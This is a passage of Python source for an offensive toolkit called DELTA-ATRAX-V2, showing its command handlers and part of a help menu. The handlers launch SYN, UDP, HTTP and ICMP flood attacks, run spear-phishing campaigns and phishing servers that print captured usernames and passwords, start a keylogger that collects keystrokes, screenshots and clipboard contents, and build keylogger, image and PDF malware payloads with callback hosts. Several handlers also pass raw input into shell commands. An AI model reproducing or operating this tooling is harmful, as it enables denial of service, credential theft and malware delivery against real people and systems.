            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        return {'success': True, 'output': "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if self.traffic.stop(args[0] if args else None):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== DOS Attacks ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        return self.dos.syn_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        return self.dos.udp_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        return self.dos.http_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        return self.dos.icmp_flood(args[0], int(args[1]), int(args[2]) if len(args) > 2 else 50)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if self.dos.stop(args[0] if args else None):
            return {'success': True, 'output': 'DOS attack stopped'}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Spear Phishing ====================
    def _spear_create(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: spear_create <name> <subject> <from> <template_file> <targets_file>'}
        try:
            with open(args[3], 'r') as f:
                template = f.read()
            with open(args[4], 'r') as f:
                targets = json.load(f)
            campaign = self.spear.create_campaign(args[0], template, args[1], args[2], targets)
            return {'success': True, 'output': f"Campaign created: {campaign.id} - {campaign.name}"}
        except Exception as e:
            return {'success': False, 'output': f"Failed to create campaign: {e}"}
    
    def _spear_send(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: spear_send <campaign_id>'}
        result = self.spear.send_campaign(args[0])
        return {'success': result.get('success', False), 'output': f"Sent {result.get('sent_count', 0)} emails"}
    
    def _spear_list(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        campaigns = self.spear.get_campaigns()
        if not campaigns:
            return {'success': True, 'output': 'No campaigns found'}
        output = "Spear Phishing Campaigns:\n"
        for c in campaigns:
            output += f"  • {c['id']} - {c['name']} ({c['status']}) - Sent: {c['sent_count']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Keylogger ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.conn.execute(
            "SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,)
        ).fetchall()
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Docker ====================
    def _docker_scan(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        result = self.docker_scanner.scan_image(args[0])
        if result['success']:
            output = f"🐳 Docker scan of {args[0]} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        return self._generic('docker info')
    
    def _docker_ps(self, args: List[str]) -> Dict:
        return self._generic('docker ps')
    
    def _docker_images(self, args: List[str]) -> Dict:
        return self._generic('docker images')
    
    def _docker_bench(self, args: List[str]) -> Dict:
        return self._generic('docker run --rm -it --net host --pid host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc -v /usr/lib/systemd:/usr/lib/systemd docker/docker-bench-security')
    
    # ==================== Reverse Engineering ====================
    def _re_strings(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'RE tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_strings <file> [min_length]'}
        result = self.re_tools.extract_strings(args[0], int(args[1]) if len(args) > 1 else None)
        return {'success': True, 'output': result[:5000]}
    
    def _re_hexdump(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'RE tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_hexdump <file> [offset] [length]'}
        offset = int(args[1]) if len(args) > 1 else 0
        length = int(args[2]) if len(args) > 2 else 256
        result = self.re_tools.hex_dump(args[0], offset, length)
        return {'success': True, 'output': result}
    
    def _re_metadata(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'RE tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_metadata <file>'}
        result = self.re_tools.analyze_metadata(args[0])
        return {'success': True, 'output': result}
    
    def _re_analyze(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'RE tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_analyze <file>'}
        output = f"🔬 Complete Analysis of {args[0]}\n" + "=" * 50 + "\n\n"
        output += self.re_tools.analyze_metadata(args[0]) + "\n\n"
        output += self.re_tools.extract_strings(args[0])[:2000]
        return {'success': True, 'output': output}
    
    def _re_list(self, args: List[str]) -> Dict:
        jobs = self.db.get_re_jobs()
        if not jobs:
            return {'success': True, 'output': 'No reverse engineering jobs found'}
        output = "🔬 Reverse Engineering Jobs:\n"
        for j in jobs:
            output += f"  • {j['job_id']} - {j['file_path']} ({j['analysis_type']})\n"
        return {'success': True, 'output': output}
    
    # ==================== Malware ====================
    def _malware_keylogger(self, args: List[str]) -> Dict:
        if not self.malware_gen:
            return {'success': False, 'output': 'Malware generator not initialized'}
        name = args[0] if args else f"keylogger_{int(time.time())}"
        host = args[1] if len(args) > 1 else None
        port = int(args[2]) if len(args) > 2 else None
        payload = self.malware_gen.generate_keylogger_payload(name, host, port)
        return {'success': True, 'output': f"Keylogger payload generated: {payload.id}\nFile: {payload.file_path}"}
    
    def _malware_image(self, args: List[str]) -> Dict:
        if not self.malware_gen:
            return {'success': False, 'output': 'Malware generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: malware_image <name> <image_file> [callback_host] [callback_port]'}
        name = args[0]
        image_path = args[1]
        host = args[2] if len(args) > 2 else None
        port = int(args[3]) if len(args) > 3 else None
        payload = self.malware_gen.generate_image_payload(name, image_path, host, port)
        if payload:
            return {'success': True, 'output': f"Image payload generated: {payload.id}\nFile: {payload.file_path}"}
        return {'success': False, 'output': 'Failed to generate image payload'}
    
    def _malware_pdf(self, args: List[str]) -> Dict:
        if not self.malware_gen:
            return {'success': False, 'output': 'Malware generator not initialized'}
        name = args[0] if args else f"pdf_payload_{int(time.time())}"
        host = args[1] if len(args) > 1 else None
        port = int(args[2]) if len(args) > 2 else None
        payload = self.malware_gen.generate_pdf_payload(name, host, port)
        return {'success': True, 'output': f"PDF payload generated: {payload.id}\nFile: {payload.file_path}"}
    
    def _malware_list(self, args: List[str]) -> Dict:
        if not self.malware_gen:
            return {'success': False, 'output': 'Malware generator not initialized'}
        payloads = self.malware_gen.list_payloads()
        if not payloads:
            return {'success': True, 'output': 'No malware payloads found'}
        output = "Malware Payloads:\n"
        for p in payloads:
            output += f"  • {p['id']} - {p['name']} ({p['payload_type']})\n"
        return {'success': True, 'output': output}
    
    # ==================== Social Engineering ====================
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(args[0], port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {args[0]}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args: List[str]) -> Dict:
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links found'}
        output = "🎣 Phishing Links:\n"
        for l in links:
            output += f"  • {l['id']} - {l['platform']} (Clicks: {l['clicks']})\n"
        return {'success': True, 'output': output}
    
    def _phish_templates(self, args: List[str]) -> Dict:
        templates = self.social.list_templates()
        output = f"🎣 Available Phishing Templates ({len(templates)}):\n"
        for t in sorted(templates):
            output += f"  • phish_{t}\n"
        return {'success': True, 'output': output}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = NetworkTools.ip_to_domain(args[0])
        try:
            ipaddress.ip_address(args[0])
            if self.db.add_managed_ip(args[0], domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {args[0]} added (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {args[0]}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (args[0],))
        self.db.conn.commit()
        return {'success': True, 'output': f'✅ IP {args[0]} removed'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        if NetworkTools.block_ip(args[0]) or self.db.block_ip(args[0], reason, 'cli'):
            return {'success': True, 'output': f'🔒 IP {args[0]} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {args[0]}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        if NetworkTools.unblock_ip(args[0]) or self.db.unblock_ip(args[0]):
            return {'success': True, 'output': f'🔓 IP {args[0]} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {args[0]}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            output += f"  {status} {ip['ip_address']} ({ip.get('domain', 'Unknown')})\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        try:
            ipaddress.ip_address(args[0])
            db_info = self.db.conn.execute("SELECT * FROM managed_ips WHERE ip_address = ?", (args[0],)).fetchone()
            location = NetworkTools.location(args[0])
            domain = NetworkTools.ip_to_domain(args[0])
            
            output = f"🔍 IP Information: {args[0]}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = NetworkTools.ip_to_domain(ip)
        
        output = f"🦀 DELTA-ATRAX-V2 IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n" + ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n" + nmap_result.output[:1000] + "\n\n"
        
        return {'success': True, 'output': output}
    
    # ==================== Network Commands ====================
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        return self._generic(f'whois {args[0]}')
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [type]'}
        record_type = args[1] if len(args) > 1 else 'A'
        return self._generic(f'dig {args[0]} {record_type} +short')
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        return self._generic(f'dig {args[0]}')
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        return self._generic(f'nslookup {args[0]}')
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.location(args[0])
        if result.get('success'):
            output = f"📍 Location for {args[0]}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {args[0]}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        return self._scan(args)
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        domain = NetworkTools.ip_to_domain(args[0])
        if domain:
            return {'success': True, 'output': f"Domain for IP {args[0]}: {domain}"}
        return {'success': False, 'output': f"No domain found for IP {args[0]}"}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        ip = NetworkTools.domain_to_ip(args[0])
        if ip:
            return {'success': True, 'output': f"IP for domain {args[0]}: {ip}"}
        return {'success': False, 'output': f"No IP found for domain {args[0]}"}
    
    # ==================== Chart Commands ====================
    def _chart_bar(self, args: List[str]) -> Dict:
        if not self.chart_gen:
            return {'success': False, 'output': 'Chart generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: chart_bar <title> <label1:value1,label2:value2,...>'}
        title = args[0]
        data_pairs = args[1].split(',')
        labels = []
        values = []
        for pair in data_pairs:
            if ':' in pair:
                label, value = pair.split(':')
                labels.append(label)
                values.append(int(value))
        if not labels:
            return {'success': False, 'output': 'Invalid data format'}
        path = self.chart_gen.generate_bar_chart(title, labels, values)
        if path:
            return {'success': True, 'output': f"📊 Bar chart generated: {path}"}
        return {'success': False, 'output': 'Failed to generate chart'}
    
    def _chart_pie(self, args: List[str]) -> Dict:
        if not self.chart_gen:
            return {'success': False, 'output': 'Chart generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: chart_pie <title> <label1:value1,label2:value2,...>'}
        title = args[0]
        data_pairs = args[1].split(',')
        labels = []
        values = []
        for pair in data_pairs:
            if ':' in pair:
                label, value = pair.split(':')
                labels.append(label)
                values.append(int(value))
        if not labels:
            return {'success': False, 'output': 'Invalid data format'}
        path = self.chart_gen.generate_pie_chart(title, labels, values)
        if path:
            return {'success': True, 'output': f"📊 Pie chart generated: {path}"}
        return {'success': False, 'output': 'Failed to generate chart'}
    
    def _chart_stats(self, args: List[str]) -> Dict:
        if not self.chart_gen:
            return {'success': False, 'output': 'Chart generator not initialized'}
        charts = self.chart_gen.generate_statistics_charts()
        if charts:
            output = "📊 Statistics charts generated:\n"
            for chart_type, path in charts.items():
                output += f"  • {chart_type}: {path}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate charts'}
    
    def _chart_list(self, args: List[str]) -> Dict:
        charts = self.db.get_charts()
        if not charts:
            return {'success': True, 'output': 'No charts found'}
        output = "📊 Generated Charts:\n"
        for c in charts:
            output += f"  • {c['chart_type']} - {c['title']} ({c['file_path']})\n"
        return {'success': True, 'output': output}
    
    # ==================== SaaS Commands ====================
    def _saas_create_tenant(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: saas_create_tenant <name> <email> [tier]'}
        name, email = args[0], args[1]
        tier = args[2] if len(args) > 2 else 'free'
        tenant = self.db.create_tenant(name, email, tier)
        if tenant:
            return {'success': True, 'output': f"Tenant created:\n  ID: {tenant.id}\n  API Key: {tenant.api_key}\n  Tier: {tenant.tier}"}
        return {'success': False, 'output': 'Failed to create tenant'}
    
    def _saas_list_tenants(self, args: List[str]) -> Dict:
        tenants = self.db.get_all_tenants()
        if not tenants:
            return {'success': True, 'output': 'No tenants found'}
        output = "SaaS Tenants:\n"
        for t in tenants:
            output += f"  • {t['id']} - {t['name']} ({t['tier']}) - Scans: {t['scans_used']}/{t['max_scans']}\n"
        return {'success': True, 'output': output}
    
    def _saas_tenant_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: saas_tenant_info <tenant_id>'}
        tenant = self.db.get_tenant(args[0])
        if tenant:
            return {'success': True, 'output': json.dumps(tenant, indent=2)}
        return {'success': False, 'output': f"Tenant {args[0]} not found"}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🦀 DELTA-ATRAX-V2 System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Docker Scans: {stats.get('total_docker_scans', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  RE Jobs: {stats.get('total_re_jobs', 0)}
  Tenants: {stats.get('total_tenants', 0)}
  Malware Payloads: {stats.get('total_malware', 0)}
  Emails: {stats.get('total_emails', 0)}
  Charts: {stats.get('total_charts', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {NetworkTools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args and args[0].isdigit() else 20
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args and args[0].isdigit() else 10
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _stats(self, args: List[str]) -> Dict:
        return self._status(args)
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _version(self, args: List[str]) -> Dict:
        return {'success': True, 'output': f"DELTA-ATRAX-V2 v{VERSION}\nAuthor: {AUTHOR}\n{TOTAL_LINES}+ lines of code"}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.SECONDARY}        🦀 DELTA-ATRAX-V2 v{VERSION} - HELP MENU                          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING COMMANDS (25+):{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep network
║  fping <targets...>            - Fast ping multiple
║  ping_flood <target>           - Flood ping
║  ping_mtu <target> <size>      - Ping with MTU
║  ping_size <target> <size>     - Ping with size
║  ping_count <target> <count>   - Ping with count
║  ping_interval <target> <sec>  - Ping with interval
║  ping_timeout <target> <sec>   - Ping with timeout
║  ping_ttl <target> <ttl>       - Ping with TTL
║  ping_interface <t> <iface>    - Ping with interface
║  ping_source <t> <ip>          - Ping with source IP
║  ping_pattern <t> <pattern>    - Ping with pattern
║  ping_record <target>          - Record route
║  ping_timestamp <target>       - Timestamps
║  ping_quiet <target>           - Quiet ping
║  ping_verbose <target>         - Verbose ping
║
║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS (30+):{Colors.RESET}
║  traceroute <target>           - Basic traceroute
║  traceroute6 <target>          - IPv6 traceroute
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║  traceroute_max_hops <t> <n>   - Max hops
║  traceroute_first_hop <t> <n>  - First hop
║  traceroute_queries <t> <n>    - Queries per hop
║  traceroute_wait <t> <sec>     - Wait time
║  traceroute_port <t> <port>    - Port
║  traceroute_numeric <target>   - Numeric output
║  mtr <target>                  - MTR
║  mtr_report <target>           - MTR report
║  mtr_json <target>             - MTR JSON
║  mtr_csv <target>              - MTR CSV
║  tcptraceroute <target>        - TCP traceroute
║  lft <target>                  - Layer Four Traceroute
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS (70+):{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan
║  nmap_os <target>              - OS detection
║  nmap_service <target>         - Service detection
║  nmap_udp <target>             - UDP scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth scan
║  nmap_ping <target>            - Ping scan
║  nmap_ports <t> <ports>        - Port range
║  nmap_script <t> <script>      - NSE script
║  nmap_aggressive <target>      - Aggressive scan
║  nmap_traceroute <target>      - Traceroute
║  nmap_output <t> <file>        - Output file
║  nmap_exclude <t> <hosts>      - Exclude hosts
║  nmap_input <file>             - Input file
║  nmap_random <count>           - Random targets
║  nmap_timing <t> <level>       - Timing
║  nmap_syn <target>             - SYN scan
║  nmap_connect <target>         - Connect scan
║  nmap_ack <target>             - ACK scan
║  nmap_fin <target>             - FIN scan
║  nmap_xmas <target>            - XMAS scan
║  nmap_null <target>            - NULL scan
║
║{Colors.SUCCESS}🌐 CURL COMMANDS (70+):{Colors.RESET}
║  curl <url>                    - Basic request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_patch <url> <data>       - PATCH request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║  curl_output <url> <file>      - Output file
║  curl_location <url>           - Follow redirects
║  curl_include <url>            - Include headers
║  curl_verbose <url>            - Verbose
║  curl_silent <url>             - Silent
║  curl_insecure <url>           - Skip SSL
║  curl_data <url> <data>        - POST data
║  curl_header <url> <header>    - Custom header
║  curl_user_agent <url> <ua>    - User agent
║  curl_user <url> <user:pass>   - Basic auth
║  curl_cookie <url> <cookie>    - Cookie
║  curl_proxy <url> <proxy>      - Proxy
║  curl_tlsv1_2 <url>            - TLS 1.2
║  curl_tlsv1_3 <url>            - TLS 1.3
║  curl_ipv4 <url>               - IPv4
║  curl_ipv6 <url>               - IPv6
║  curl_http2 <url>              - HTTP/2
║  curl_compressed <url>         - Compressed
║  curl_json <url> <json>        - JSON POST
║
║{Colors.SUCCESS}⬇️ WGET COMMANDS (60+):{Colors.RESET}
║  wget <url>                    - Basic download
║  wget_output <url> <file>      - Output file
║  wget_continue <url>           - Resume
║  wget_background <url>         - Background
